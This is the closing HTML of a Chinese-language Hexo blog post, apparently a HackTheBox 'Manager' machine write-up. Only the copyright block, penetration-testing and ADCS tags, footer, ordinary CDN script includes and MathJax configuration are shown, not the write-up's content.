<!-- flag of hidden posts --></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/02/02/hackthebox-machine-manager/">http://example.com/2024/02/02/hackthebox-machine-manager/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/ADCS/">ADCS</a></div><nav id="pagination"></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2025 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>